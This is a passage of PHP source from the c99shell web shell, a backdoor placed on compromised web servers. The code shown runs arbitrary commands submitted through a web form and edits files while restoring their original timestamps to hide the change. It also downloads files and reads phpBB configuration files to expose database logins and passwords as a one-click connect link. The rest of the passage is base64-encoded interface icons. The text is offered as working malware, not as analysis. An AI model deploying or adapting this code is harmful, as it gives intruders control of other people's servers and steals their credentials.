<nobr>[<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=info&base64=3&d=' . urlencode($sp6bf0a4) . '">+chunk+quotes</a>]&nbsp;</nobr>
<nobr>[<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=info&base64=4&d=' . urlencode($sp6bf0a4) . '">Decode</a>]&nbsp;</nobr>
<P>'; } elseif ($spd19b50 == 'html') { if ($spa7f949) { @ob_clean(); } echo $spd6dd63; if ($spa7f949) { c99shexit(); } } elseif ($spd19b50 == 'txt') { echo '<pre>' . htmlspecialchars($spd6dd63) . '</pre>'; } elseif ($spd19b50 == 'ini') { echo '<pre>'; var_dump(parse_ini_file($sp6bf0a4 . $sp224638, true)); echo '</pre>'; } elseif ($spd19b50 == 'phpsess') { echo '<pre>'; $spe2ff4f = explode('|', $spd6dd63); echo $spe2ff4f[0] . '<br>'; var_dump(unserialize($spe2ff4f[1])); echo '</pre>'; } elseif ($spd19b50 == 'exe') { $spe7e244 = explode('.', $sp224638); $sp76d016 = count($spe7e244) - 1; $spe7e244 = $spe7e244[$sp76d016]; $spe7e244 = strtolower($spe7e244); $sp0a0cd5 = ''; foreach ($spb7a887 as $sp71a197 => $spe2ff4f) { if (in_array($spe7e244, $spe2ff4f)) { $sp0a0cd5 = $sp71a197; break; } } $sp7bd36a = str_replace('%f%', $sp224638, $sp0a0cd5); echo '<b>Execute file:</b><form action="' . $sp8c8b96 . '" method=POST><input type=hidden name=act value=cmd><input type="text" name="cmd" value="' . htmlspecialchars($sp7bd36a) . '" size="' . (strlen($sp7bd36a) + 2) . '"><br>Display in text-area<input type="checkbox" name="cmd_txt" value="1" checked><input type=hidden name="d" value="' . htmlspecialchars($sp6bf0a4) . '"><br><input type=submit name=submit value="Execute"></form>'; } elseif ($spd19b50 == 'sdb') { echo '<pre>'; var_dump(unserialize(base64_decode($spd6dd63))); echo '</pre>'; } elseif ($spd19b50 == 'code') { if (preg_match('php' . 'BB 2.(.*) auto-generated config file', $spd6dd63)) { $sp662a5a = explode('
', $spd6dd63); if (count($sp662a5a == 18)) { include $sp6bf0a4 . $sp224638; echo '<b>phpBB configuration is detected in this file!<br>'; if ($sp52de53 == 'mysql4') { $sp52de53 = 'mysql'; } if ($sp52de53 == 'mysql') { echo '<a href="' . $sp8c8b96 . 'act=sql&sql_server=' . htmlspecialchars($spf65dbc) . '&sql_login=' . htmlspecialchars($sp9d1e01) . '&sql_passwd=' . htmlspecialchars($spfa58cd) . '&sql_port=3306&sql_db=' . htmlspecialchars($spf835c8) . '"><b><u>Connect to DB</u></b></a><br><br>'; } else { echo 'But, you can\'t connect to forum sql-base, because db-software="' . $sp52de53 . '" is not supported by c99shell. Please, report us for fix.'; } echo 'Parameters for manual connect:<br>'; $spa4c65c = array('dbms' => $sp52de53, 'dbhost' => $spf65dbc, 'dbname' => $spf835c8, 'dbuser' => $sp9d1e01, 'dbpasswd' => $spfa58cd); foreach ($spa4c65c as $sp71a197 => $spe2ff4f) { echo htmlspecialchars($sp71a197) . '=\'' . htmlspecialchars($spe2ff4f) . '\'<br>'; } echo '</b><hr size="1" noshade>'; } } echo '<div style="border : 0px solid #FFFFFF; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ' . $sp11f53b . ';">'; if (!empty($spa7f949)) { @ob_clean(); } highlight_file($sp6bf0a4 . $sp224638); if (!empty($spa7f949)) { c99shexit(); } echo '</div>'; } elseif ($spd19b50 == 'download') { @ob_clean(); header('Content-type: application/octet-stream'); header('Content-length: ' . filesize($sp6bf0a4 . $sp224638)); header('Content-disposition: attachment; filename="' . $sp224638 . '";'); echo $spd6dd63; die; } elseif ($spd19b50 == 'notepad') { @ob_clean(); header('Content-type: text/plain'); header('Content-disposition: attachment; filename="' . $sp224638 . '.txt";'); echo $spd6dd63; die; } elseif ($spd19b50 == 'img') { $sp0c2316 = getimagesize($sp6bf0a4 . $sp224638); if (!$spa7f949) { if (empty($sp9e4887)) { $sp9e4887 = 20; } $sp110ff9 = $sp0c2316[0] / 100 * $sp9e4887; $sp164ad9 = $sp0c2316[1] / 100 * $sp9e4887; echo '<center><b>Size:</b>&nbsp;'; $sp829989 = array('100', '50', '20'); foreach ($sp829989 as $spe2ff4f) { echo '<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=img&d=' . urlencode($sp6bf0a4) . '&imgsize=' . $spe2ff4f . '">'; if ($sp9e4887 != $spe2ff4f) { echo $spe2ff4f; } else { echo '<u>' . $spe2ff4f . '</u>'; } echo '</a>&nbsp;&nbsp;&nbsp;'; } echo '<br><br><img src="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=img&white=1&d=' . urlencode($sp6bf0a4) . '" width="' . $sp110ff9 . '" height="' . $sp164ad9 . '" border="1"></center>'; } else { @ob_clean(); $spe7e244 = explode($sp224638, '.'); $spe7e244 = $spe7e244[count($spe7e244) - 1]; header('Content-type: ' . $sp0c2316['mime']); readfile($sp6bf0a4 . $sp224638); die; } } elseif ($spd19b50 == 'edit') { if (!empty($spff71ed)) { if ($spfc68ef) { $spb5bb2c = stat($sp6bf0a4 . $sp224638); } $sp694629 = fopen($sp6bf0a4 . $sp224638, 'w'); if (!$sp694629) { echo '<b>Can\'t write to file!</b>'; } else { echo '<b>Saved!</b>'; fwrite($sp694629, $sp735082); fclose($sp694629); if ($spfc68ef) { touch($sp6bf0a4 . $sp224638, $spb5bb2c[9], $spb5bb2c[8]); } $spd6dd63 = $sp735082; } } $spb7d784 = count(explode('
', $spd6dd63)); if ($spb7d784 < 10) { $spb7d784 = 10; } if ($spb7d784 > 30) { $spb7d784 = 30; } echo '<form action="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=edit&d=' . urlencode($sp6bf0a4) . '" method=POST><input type=submit name=submit value="Save">&nbsp;<input type="reset" value="Reset">&nbsp;<input type="button" onclick="location.href=\'' . addslashes($sp8c8b96 . 'act=ls&d=' . substr($sp6bf0a4, 0, -1)) . '\';" value="Back"><br><textarea name="edit_text" cols="122" rows="' . $spb7d784 . '">' . htmlspecialchars($spd6dd63) . '</textarea></form>'; } elseif (!empty($spd19b50)) { echo '<center><b>Manually selected type is incorrect. If you think, it is mistake, please send us url and dump of $GLOBALS.</b></center>'; } else { echo '<center><b>Unknown extension (' . $spe7e244 . '), please, select type manually.</b></center>'; } } } } else { @ob_clean(); echo '[syslog]03
'; $spfff1b9 = array('arrow_ltr' => 'R0lGODlhJgAWAIAAAAAAAP///yH5BAUUAAEALAAAAAAmABYAAAIvjI+py+0PF4i0gVvzuVxXDnoQ' . 'SIrUZGZoerKf28KjPNPOaku5RfZ+uQsKh8RiogAAOw==', 'back' => 'R0lGODlhFAAUAKIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8' . 'aLrc/jDKSWWpjVysSNiYJ4CUOBJoqjniILzwuzLtYN/3zBSErf6kBW+gKRiPRghPh+EFK0mOUEqt' . 'Wg0JADs=', 'buffer' => 'R0lGODlhFAAUAKIAAAAAAP////j4+N3d3czMzLKysoaGhv///yH5BAEAAAcALAAAAAAUABQAAANo' . 'eLrcribG90y4F1Amu5+NhY2kxl2CMKwrQRSGuVjp4LmwDAWqiAGFXChg+xhnRB+ptLOhai1crEmD' . 'Dlwv4cEC46mi2YgJQKaxsEGDFnnGwWDTEzj9jrPRdbhuG8Cr/2INZIOEhXsbDwkAOw==', 'change' => 'R0lGODlhFAAUAMQfAL3hj7nX+pqo1ejy/f7YAcTb+8vh+6FtH56WZtvr/RAQEZecx9Ll/PX6/v3+' . '/3eHt6q88eHu/ZkfH3yVyIuQt+72/kOm99fo/P8AZm57rkGS4Hez6pil9oep3GZmZv///yH5BAEA' . 'AB8ALAAAAAAUABQAAAWf4CeOZGme6NmtLOulX+c4TVNVQ7e9qFzfg4HFonkdJA5S54cbRAoFyEOC' . 'wSiUtmYkkrgwOAeA5zrqaLldBiNMIJeD266XYTgQDm5Rx8mdG+oAbSYdaH4Ga3c8JBMJaXQGBQgA' . 'CHkjE4aQkQ0AlSITan+ZAQqkiiQPj1AFAaMKEKYjD39QrKwKAa8nGQK8Agu/CxTCsCMexsfIxjDL' . 'zMshADs=', 'delete' => 'R0lGODlhFAAUAOZZAPz8/NPFyNgHLs0YOvPz8/b29sacpNXV1fX19cwXOfDw8Kenp/n5+etgeunp' . '6dcGLMMpRurq6pKSktvb2+/v7+1wh3R0dPnP17iAipxyel9fX7djcscSM93d3ZGRkeEsTevd4LCw' . 'sGRkZGpOU+IfQ+EQNoh6fdIcPeHh4YWFhbJQYvLy8ui+xm5ubsxccOx8kcM4UtY9WeAdQYmJifWv' . 'vHx8fMnJycM3Uf3v8rRue98ONbOzs9YFK5SUlKYoP+Tk5N0oSufn57ZGWsQrR9kIL5CQkOPj42Vl' . 'ZeAPNudAX9sKMPv7+15QU5ubm39/f8e5u4xiatra2ubKz8PDw+pfee9/lMK0t81rfd8AKf///wAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5' . 'BAEAAFkALAAAAAAUABQAAAesgFmCg4SFhoeIhiUfIImIMlgQB46GLAlYQkaFVVhSAIZLT5cbEYI4' . 'STo5MxOfhQwBA1gYChckQBk1OwiIALACLkgxJilTBI69RFhDFh4HDJRZVFgPPFBR0FkNWDdMHA8G' . 'BZTaMCISVgMC4IkVWCcaPSi96OqGNFhKI04dgr0QWFcKDL3A4uOIjVZZABxQIWDBLkIEQrRoQsHQ' . 'jwVFHBgiEGQFIgQasYkcSbJQIAA7', 'download' => 'R0lGODlhFAAUALMIAAD/AACAAIAAAMDAwH9/f/8AAP///wAAAP///wAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAgALAAAAAAUABQAAAROEMlJq704UyGOvkLhfVU4kpOJSpx5nF9YiCtLf0SuH7pu' . 'EYOgcBgkwAiGpHKZzB2JxADASQFCidQJsMfdGqsDJnOQlXTP38przWbX3qgIADs=', 'forward' => 'R0lGODlhFAAUAPIAAAAAAP///93d3cDAwIaGhgQEBP///wAAACH5BAEAAAYALAAAAAAUABQAAAM8' . 'aLrc/jDK2Qp9xV5WiN5G50FZaRLD6IhE66Lpt3RDbd9CQFSE4P++QW7He7UKPh0IqVw2l0RQSEqt' . 'WqsJADs=', 'home' => 'R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzLKysoaGhmZmZgQEBP///wAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAkALAAAAAAUABQAAAR+MMk5TTWI6ipyMoO3cUWRgeJoCCaLoKO0mq0ZxjNSBDWS' . 'krqAsLfJ7YQBl4tiRCYFSpPMdRRCoQOiL4i8CgZgk09WfWLBYZHB6UWjCequwEDHuOEVK3QtgN/j' . 'VwMrBDZvgF+ChHaGeYiCBQYHCH8VBJaWdAeSl5YiW5+goBIRADs=', 'mode' => 'R0lGODlhHQAUALMAAAAAAP///6CgpN3d3czMzIaGhmZmZl9fX////wAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAgALAAAAAAdABQAAASBEMlJq70461m6/+AHZMUgnGiqniNWHHAsz3F7FUGu73xO' . '2BZcwGDoEXk/Uq4ICACeQ6fzmXTlns0ddle99b7cFvYpER55Z10Xy1lKt8wpoIsACrdaqBpYEYK/' . 'dH1LRWiEe0pRTXBvVHwUd3o6eD6OHASXmJmamJUSY5+gnxujpBIRADs=', 'refresh' => 'R0lGODlhEQAUALMAAAAAAP////Hx8erq6uPj493d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAA' . 'AAAAACH5BAEAAAwALAAAAAARABQAAAR1kMlJq0Q460xR+GAoIMvkheIYlMyJBkJ8lm6YxMKi6zWY' . '3AKCYbjo/Y4EQqFgKIYUh8EvuWQ6PwPFQJpULpunrXZLrYKx20G3oDA7093Esv19q5O/woFu9ZAJ' . 'R3lufmWCVX13h3KHfWWMjGBDkpOUTTuXmJgRADs=', 'search' => 'R0lGODlhFAAUALMAAAAAAP///+rq6t3d3czMzMDAwLKysoaGhnd3d2ZmZl9fX01NTSkpKQQEBP//' . '/wAAACH5BAEAAA4ALAAAAAAUABQAAASn0Ml5qj0z5xr6+JZGeUZpHIqRNOIRfIYiy+a6vcOpHOap' . 's5IKQccz8XgK4EGgQqWMvkrSscylhoaFVmuZLgUDAnZxEBMODSnrkhiSCZ4CGrUWMA+LLDxuSHsD' . 'AkN4C3sfBX10VHaBJ4QfA4eIU4pijQcFmCVoNkFlggcMRScNSUCdJyhoDasNZ5MTDVsXBwlviRmr' . 'Cbq7C6sIrqawrKwTv68iyA6rDhEAOw==', 'setup' => 'R0lGODlhFAAUAMQAAAAAAP////j4+OPj493d3czMzMDAwLKyspaWloaGhnd3d2ZmZl9fX01NTUJC' . 'QhwcHP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA' . 'ABAALAAAAAAUABQAAAWVICSKikKWaDmuShCUbjzMwEoGhVvsfHEENRYOgegljkeg0PF4KBIFRMIB' . 'qCaCJ4eIGQVoIVWsTfQoXMfoUfmMZrgZ2GNDPGII7gJDLYErwG1vgW8CCQtzgHiJAnaFhyt2dwQE' . 'OwcMZoZ0kJKUlZeOdQKbPgedjZmhnAcJlqaIqUesmIikpEixnyJhulUMhg24aSO6YyEAOw==', 'small_dir' => 'R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp' . '/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs=', 'small_unk' => 'R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U' . 'p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo' . '/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31' . '/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4' . '/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP' . 'wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz' . '9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ' . '66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io' . '24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz' . 'aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM' . 'uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC' . 'yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj' . 'yAsokBkQADs=', 'multipage' => 'R0lGODlhCgAMAJEDAP/////3mQAAAAAAACH5BAEAAAMALAAAAAAKAAwAAAIj3IR' . 'pJhCODnovidAovBdMzzkixlXdlI2oZpJWEsSywLzRUAAAOw==', 'sort_asc' => 'R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMa' . 'SLrcPcE9GKUaQlQ5sN5PloFLJ35OoK6q5SYAOw==', 'sort_desc' => 'R0lGODlhDgAJAKIAAAAAAP///9TQyICAgP///wAAAAAAAAAAACH5BAEAAAQALAAAAAAOAAkAAAMb' . 'SLrcOjBCB4UVITgyLt5ch2mgSJZDBi7p6hIJADs=', 'sql_button_drop' => 'R0lGODlhCQALAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/' . '/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm' . 'AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/' . 'MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm' . 'ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/' . 'mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm' . 'zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/' . '/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ' . 'AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA' . 'M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ' . 'ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A' . 'mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z' . 'zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAsA' . 'AAg4AP8JREFQ4D+CCBOi4MawITeFCg/iQhEPxcSBlFCoQ5Fx4MSKv1BgRGGMo0iJFC2ehHjSoMt/' . 'AQEAOw==', 'sql_button_empty' => 'R0lGODlhCQAKAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/' . '/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm' . 'AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/' . 'MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm' . 'ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/' . 'mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm' . 'zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/' . '/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ' . 'AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA' . 'M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ' . 'ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A' . 'mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z' . 'zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAAJAAoA' . 'AAgjAP8JREFQ4D+CCBOiMMhQocKDEBcujEiRosSBFjFenOhwYUAAOw==', 'sql_button_insert' => 'R0lGODlhDQAMAPcAAAAAAIAAAACAAICAAAAAgIAAgACAgICAgMDAwP8AAAD/AP//AAAA//8A/wD/' . '/////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMwAAZgAAmQAAzAAA/wAzAAAzMwAzZgAzmQAzzAAz/wBm' . 'AABmMwBmZgBmmQBmzABm/wCZAACZMwCZZgCZmQCZzACZ/wDMAADMMwDMZgDMmQDMzADM/wD/AAD/' . 'MwD/ZgD/mQD/zAD//zMAADMAMzMAZjMAmTMAzDMA/zMzADMzMzMzZjMzmTMzzDMz/zNmADNmMzNm' . 'ZjNmmTNmzDNm/zOZADOZMzOZZjOZmTOZzDOZ/zPMADPMMzPMZjPMmTPMzDPM/zP/ADP/MzP/ZjP/' . 'mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm' . 'zGZm/2aZAGaZM2aZZmaZmWaZzGaZ/2bMAGbMM2bMZmbMmWbMzGbM/2b/AGb/M2b/Zmb/mWb/zGb/' . '/5kAAJkAM5kAZpkAmZkAzJkA/5kzAJkzM5kzZpkzmZkzzJkz/5lmAJlmM5lmZplmmZlmzJlm/5mZ' . 'AJmZM5mZZpmZmZmZzJmZ/5nMAJnMM5nMZpnMmZnMzJnM/5n/AJn/M5n/Zpn/mZn/zJn//8wAAMwA' . 'M8wAZswAmcwAzMwA/8wzAMwzM8wzZswzmcwzzMwz/8xmAMxmM8xmZsxmmcxmzMxm/8yZAMyZM8yZ' . 'ZsyZmcyZzMyZ/8zMAMzMM8zMZszMmczMzMzM/8z/AMz/M8z/Zsz/mcz/zMz///8AAP8AM/8AZv8A' . 'mf8AzP8A//8zAP8zM/8zZv8zmf8zzP8z//9mAP9mM/9mZv9mmf9mzP9m//+ZAP+ZM/+ZZv+Zmf+Z' . 'zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA' . 'AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=', 'up' => 'R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg' . '+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV' . 'IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==', 'write' => 'R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA' . 'AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze' . 'EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61' . 'LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==', 'ext_asp' => 'R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/' . '/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI' . 'D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=', 'ext_mp3' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU' . 'aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc' . 'IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=', 'ext_avi' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM' . 'WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4' . 'PYXCyg+V2i44XeRmSfYqsGhAAgA7', 'ext_cgi' => 'R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9' . 'DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6' . 'LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S' . 'Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ' . 'Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' . 'AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM' . 'BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD' . 'AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi' . 'RYtMAgEAOw==', 'ext_cmd' => 'R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI' . 'eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN' . 'dmrYAMn1onq/YKpjvEgAADs=', 'ext_cpp' => 'R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC' . 'WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra' . 'Eq7YrLDE7a4SADs=', 'ext_ini' => 'R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL' . 'aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM' . 'SnEjgPVarHEHgrB43JvszsQEADs=', 'ext_diz' => 'R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs' . 